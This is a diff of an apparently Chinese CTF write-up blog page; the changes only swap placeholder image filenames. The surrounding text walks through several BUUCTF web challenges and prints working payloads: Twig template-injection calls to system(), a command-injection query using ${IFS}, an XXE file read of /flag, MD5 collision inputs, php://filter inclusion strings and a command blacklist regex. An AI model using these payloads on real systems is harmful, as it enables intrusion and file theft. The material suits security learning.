@@ -216,24 +216,24 @@ if (sco_keyboards) {
 <p>/flag.php</p>
 <p>存在模板注入</p>
 <pre class="language-none"><code class="language-none">{{3*3}} =&gt; %20%7b%7b%33%2a%33%7d%7d</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251411092.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251411092.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">{{3*'3'}} =&gt; %7b%7b%33%2a%27%33%27%7d%7d</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251412211.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251412211.avif" alt="" loading="lazy"></p>
 <p>Twig 模板注入</p>
 <pre class="language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls")} =&gt; %7b%7b%5f%73%65%6c%66%2e%65%6e%76%2e%72%65%67%69%73%74%65%72%55%6e%64%65%66%69%6e%65%64%46%69%6c%74%65%72%43%61%6c%6c%62%61%63%6b%28%22%73%79%73%74%65%6d%22%29%7d%7d%7b%7b%5f%73%65%6c%66%2e%65%6e%76%2e%67%65%74%46%69%6c%74%65%72%28%22%6c%73%22%29%7d%7d</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251426691.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251426691.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls /")}} =&gt; %7b%7b%5f%73%65%6c%66%2e%65%6e%76%2e%72%65%67%69%73%74%65%72%55%6e%64%65%66%69%6e%65%64%46%69%6c%74%65%72%43%61%6c%6c%62%61%63%6b%28%22%73%79%73%74%65%6d%22%29%7d%7d%7b%7b%5f%73%65%6c%66%2e%65%6e%76%2e%67%65%74%46%69%6c%74%65%72%28%22%6c%73%20%2f%22%29%7d%7d</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251428478.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251428478.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}} =&gt; %7b%7b%5f%73%65%6c%66%2e%65%6e%76%2e%72%65%67%69%73%74%65%72%55%6e%64%65%66%69%6e%65%64%46%69%6c%74%65%72%43%61%6c%6c%62%61%63%6b%28%22%73%79%73%74%65%6d%22%29%7d%7d%7b%7b%5f%73%65%6c%66%2e%65%6e%76%2e%67%65%74%46%69%6c%74%65%72%28%22%63%61%74%20%2f%66%6c%61%67%22%29%7d%7d</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251431065.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251431065.avif" alt="" loading="lazy"></p>
 <h2 id="WUSTCTF2020-朴实无华"><a class="headerlink" href="#WUSTCTF2020-朴实无华"></a>[WUSTCTF2020]朴实无华</h2>
 <p>扫目录</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">py <span class="token parameter variable">-3</span> dirsearch.py <span class="token parameter variable">-u</span> http://a14b2b12-84cc-4091-ad39-ccb3ef43d269.node4.buuoj.cn:81/ <span class="token parameter variable">-e</span> * <span class="token parameter variable">--timeout</span><span class="token operator">=</span><span class="token number">2</span> <span class="token parameter variable">-t</span> <span class="token number">1</span> <span class="token parameter variable">-x</span> <span class="token number">400,403</span>,404,500,503,429</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251729526.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251729526.avif" alt="" loading="lazy"></p>
 <p>/robots.txt</p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">User-agent: *
 Disallow: /fAke_f1agggg.php</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251807122.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251807122.avif" alt="" loading="lazy"></p>
 <p>hint: Look_at_me: /fl4g.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -284,9 +284,9 @@ Disallow: /fAke_f1agggg.php</code></pre>
 <code>0e291242476940776845150308577824</code></p>
 <p>黑名单绕过<code>${IFS}</code>绕过空格</p>
 <p>?num=2e9&amp;md5=0e215962017&amp;get_flag=ls</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251830678.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251830678.avif" alt="" loading="lazy"></p>
 <p>?num=2e9&amp;md5=0e215962017&amp;get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205251836507.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205251836507.avif" alt="" loading="lazy"></p>
 <h2 id="安洵杯-2019-easy-web"><a class="headerlink" href="#安洵杯-2019-easy-web"></a>[安洵杯 2019]easy_web</h2>
 <p>data 协议传输图片</p>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre>
@@ -307,7 +307,7 @@ MzUzNTM1MmU3MDZlNjc=
 Njk2ZTY0NjU3ODJlNzA2ODcw
 =&gt; 
 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205231436211.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205231436211.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=</code></pre>
 <p>base64 解码</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -344,10 +344,10 @@ TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre>
 <p>md5 强类型比较</p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
 <p>cmd 传参处 dir 没有过滤</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205231529153.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205231530380.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205231529153.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205231530380.avif" alt="" loading="lazy"></p>
 <p><code>\</code>绕过正则匹配</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205231532640.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205231532640.avif" alt="" loading="lazy"></p>
 <h2 id="NCTF2019-Fake-XML-cookbook"><a class="headerlink" href="#NCTF2019-Fake-XML-cookbook"></a>[NCTF2019]Fake XML cookbook</h2>
 <p>XXE使用file协议读取flag</p>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
@@ -355,19 +355,19 @@ TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre>
     &lt;!ENTITY file SYSTEM "file:///flag"&gt;
 </span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205191953728.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205191953728.avif" alt="" loading="lazy"></p>
 <h2 id="强网杯-2019-高明的黑客"><a class="headerlink" href="#强网杯-2019-高明的黑客"></a>[强网杯 2019]高明的黑客</h2>
 <p>/www.tar.gz</p>
 <p>下载源码</p>
 <p>需要找到可以利用的有效代码段</p>
 <p>有许多可用的脚本，如下</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$XnEGfa</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Efa5BVG'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205192227487.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205192227487.avif" alt="" loading="lazy"></p>
 <h2 id="BJDCTF2020-Mark-loves-cat"><a class="headerlink" href="#BJDCTF2020-Mark-loves-cat"></a>[BJDCTF2020]Mark loves cat</h2>
 <p>在 CONTACT 处尝试后无果</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205182326551.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205182326551.avif" alt="" loading="lazy"></p>
 <p>扫目录</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205182305110.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205182305110.avif" alt="" loading="lazy"></p>
 <p>GitHack 下载源码</p>
 <p>index.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -434,16 +434,16 @@ TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre>
 is=flag&amp;flag=flag
 
 handsome=flag&amp;flag=x&amp;x=flag</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205182358142.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205182358142.avif" alt="" loading="lazy"></p>
 <h2 id="BSidesCF-2020-Had-a-bad-day"><a class="headerlink" href="#BSidesCF-2020-Had-a-bad-day"></a>[BSidesCF 2020]Had a bad day</h2>
 <pre class="language-txt" data-language="txt"><code class="language-txt">category=php://filter/read=convert.base64-encode/resource=index.php</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181816411.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181816411.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">include(php://filter/read=convert.base64-encode/resource=index.php.php)</code></pre>
 <p>报错提示多了个 .php</p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">category=php://filter/read=convert.base64-encode/resource=index</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181819899.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181819899.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">PGh0bWw+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkltYWdlcyB0aGF0IHNwYXJrIGpveSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhZCBhIGJhZCBkYXk/PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL21hdGVyaWFsLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJwYWdlLWxheW91dCBtZGwtbGF5b3V0IG1kbC1sYXlvdXQtLWZpeGVkLWhlYWRlciBtZGwtanMtbGF5b3V0IG1kbC1jb2xvci0tZ3JleS0xMDAiPgogICAgICA8aGVhZGVyIGNsYXNzPSJwYWdlLWhlYWRlciBtZGwtbGF5b3V0X19oZWFkZXIgbWRsLWxheW91dF9faGVhZGVyLS1zY3JvbGwgbWRsLWNvbG9yLS1ncmV5LTEwMCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAiPgogICAgICAgIDxkaXYgY2xhc3M9Im1kbC1sYXlvdXRfX2hlYWRlci1yb3ciPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im1kbC1sYXlvdXQtdGl0bGUiPkhhZCBhIGJhZCBkYXk/PC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWxheW91dC1zcGFjZXIiPjwvZGl2PgogICAgICAgIDxkaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJwYWdlLXJpYmJvbiI+PC9kaXY+CiAgICAgIDxtYWluIGNsYXNzPSJwYWdlLW1haW4gbWRsLWxheW91dF9fY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgbWRsLWdyaWQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWNlbGwgbWRsLWNlbGwtLTItY29sIG1kbC1jZWxsLS1oaWRlLXRhYmxldCBtZGwtY2VsbC0taGlkZS1waG9uZSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQgbWRsLWNvbG9yLS13aGl0ZSBtZGwtc2hhZG93LS00ZHAgY29udGVudCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAgbWRsLWNlbGwgbWRsLWNlbGwtLTgtY29sIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jcnVtYnMgbWRsLWNvbG9yLXRleHQtLWdyZXktNTAwIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxoMz5DaGVlciB1cCE8L2gzPgogICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGlkIHlvdSBoYXZlIGEgYmFkIGRheT8gRGlkIHRoaW5ncyBub3QgZ28geW91ciB3YXkgdG9kYXk/IEFyZSB5b3UgZmVlbGluZyBkb3duPyBQaWNrIGFuIG9wdGlvbiBhbmQgbGV0IHRoZSBhZG9yYWJsZSBpbWFnZXMgY2hlZXIgeW91IHVwIQogICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWluY2x1ZGUiPgogICAgICAgICAgICAgIDw/cGhwCgkJCQkkZmlsZSA9ICRfR0VUWydjYXRlZ29yeSddOwoKCQkJCWlmKGlzc2V0KCRmaWxlKSkKCQkJCXsKCQkJCQlpZiggc3RycG9zKCAkZmlsZSwgIndvb2ZlcnMiICkgIT09ICBmYWxzZSB8fCBzdHJwb3MoICRmaWxlLCAibWVvd2VycyIgKSAhPT0gIGZhbHNlIHx8IHN0cnBvcyggJGZpbGUsICJpbmRleCIpKXsKCQkJCQkJaW5jbHVkZSAoJGZpbGUgLiAnLnBocCcpOwoJCQkJCX0KCQkJCQllbHNlewoJCQkJCQllY2hvICJTb3JyeSwgd2UgY3VycmVudGx5IG9ubHkgc3VwcG9ydCB3b29mZXJzIGFuZCBtZW93ZXJzLiI7CgkJCQkJfQoJCQkJfQoJCQkJPz4KCQkJPC9kaXY+CiAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiIGlkPSJjaG9pY2UiPgogICAgICAgICAgICAgIDxjZW50ZXI+PGJ1dHRvbiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hvaWNlJykuc3VibWl0KCk7IiBuYW1lPSJjYXRlZ29yeSIgdmFsdWU9Indvb2ZlcnMiIGNsYXNzPSJtZGwtYnV0dG9uIG1kbC1idXR0b24tLWNvbG9yZWQgbWRsLWJ1dHRvbi0tcmFpc2VkIG1kbC1qcy1idXR0b24gbWRsLWpzLXJpcHBsZS1lZmZlY3QiIGRhdGEtdXBncmFkZWQ9IixNYXRlcmlhbEJ1dHRvbixNYXRlcmlhbFJpcHBsZSI+V29vZmVyczxzcGFuIGNsYXNzPSJtZGwtYnV0dG9uX19yaXBwbGUtY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibWRsLXJpcHBsZSBpcy1hbmltYXRpbmciIHN0eWxlPSJ3aWR0aDogMTg5LjM1NnB4OyBoZWlnaHQ6IDE4OS4zNTZweDsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgdHJhbnNsYXRlKDMxcHgsIDI1cHgpOyI+PC9zcGFuPjwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaG9pY2UnKS5zdWJtaXQoKTsiIG5hbWU9ImNhdGVnb3J5IiB2YWx1ZT0ibWVvd2VycyIgY2xhc3M9Im1kbC1idXR0b24gbWRsLWJ1dHRvbi0tY29sb3JlZCBtZGwtYnV0dG9uLS1yYWlzZWQgbWRsLWpzLWJ1dHRvbiBtZGwtanMtcmlwcGxlLWVmZmVjdCIgZGF0YS11cGdyYWRlZD0iLE1hdGVyaWFsQnV0dG9uLE1hdGVyaWFsUmlwcGxlIj5NZW93ZXJzPHNwYW4gY2xhc3M9Im1kbC1idXR0b25fX3JpcHBsZS1jb250YWluZXIiPjxzcGFuIGNsYXNzPSJtZGwtcmlwcGxlIGlzLWFuaW1hdGluZyIgc3R5bGU9IndpZHRoOiAxODkuMzU2cHg7IGhlaWdodDogMTg5LjM1NnB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSB0cmFuc2xhdGUoMzFweCwgMjVweCk7Ij48L3NwYW4+PC9zcGFuPjwvYnV0dG9uPjwvY2VudGVyPgogICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L21haW4+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJqcy9tYXRlcmlhbC5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181820179.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181820179.avif" alt="" loading="lazy"></p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
@@ -460,10 +460,10 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <p>参数被限制为 <code>woofers</code> <code>meowers</code> <code>index</code></p>
 <p>伪协议嵌套其中一个达到可以匹配 flag 的目的</p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">php://filter/read=convert.base64-encode/woofers/resource=flag</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181834267.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181834267.avif" alt="" loading="lazy"></p>
 <p>也可以这样构造</p>
